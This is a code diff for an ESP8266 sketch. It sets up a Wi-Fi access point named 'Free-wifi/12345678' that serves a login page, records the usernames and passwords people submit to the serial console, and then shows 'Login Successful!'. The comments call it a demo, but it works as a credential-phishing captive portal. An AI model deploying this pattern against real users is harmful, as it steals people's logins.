@@ -1,9 +1,11 @@
 #include <ESP8266WiFi.h>
 #include <ESP8266WebServer.h>
- 
-const char *ssid = "MyESP8266AP";
-const char *password = "testpassword";
- 
+
+// Set the credentials for your access point
+const char* ssid = "Free-wifi/12345678";
+const char* password = "12345678";
+
+// Create an instance of the web server
 ESP8266WebServer server(80);
 
 // HTML login page
@@ -17,29 +19,51 @@ const char* htmlPage = "<html><body>"
                        "<input type='submit' value='Submit'>"
                        "</form>"
                        "</body></html>";
-                       
-void handleRoot() {
-  server.send(200, "text/html", htmlPage);
-}
- 
+
 void setup() {
- 
+  // Start serial communication
   Serial.begin(115200);
- 
+
+  // Connect to the access point
+  WiFi.mode(WIFI_AP);
   WiFi.softAP(ssid, password);
- 
-  Serial.println();
-  Serial.print("Server IP address: ");
+
+  // Print the IP address of the access point
+  Serial.print("Access Point IP address: ");
   Serial.println(WiFi.softAPIP());
-  Serial.print("Server MAC address: ");
-  Serial.println(WiFi.softAPmacAddress());
- 
-  server.on("/", handleRoot);
+
+  // Handle root URL request
+  server.on("/", []() {
+    server.send(200, "text/html", htmlPage);
+  });
+
+  // Handle login form submission
+  server.on("/login", []() {
+    String username = server.arg("username");
+    String password = server.arg("password");
+
+    // Perform your login verification here
+    // For demonstration purposes, let's just print the entered credentials
+    Serial.print("Username: ");
+    Serial.println(username);
+    Serial.print("Password: ");
+    Serial.println(password);
+
+    // Redirect to a success page
+    server.sendHeader("Location", "/success");
+    server.send(302, "text/plain", "");
+  });
+
+  // Handle success page
+  server.on("/success", []() {
+    server.send(200, "text/html", "<h1>Login Successful!</h1>");
+  });
+
+  // Start the server
   server.begin();
- 
-  Serial.println("Server listening");
 }
- 
+
 void loop() {
+  // Handle client requests
   server.handleClient();
 }
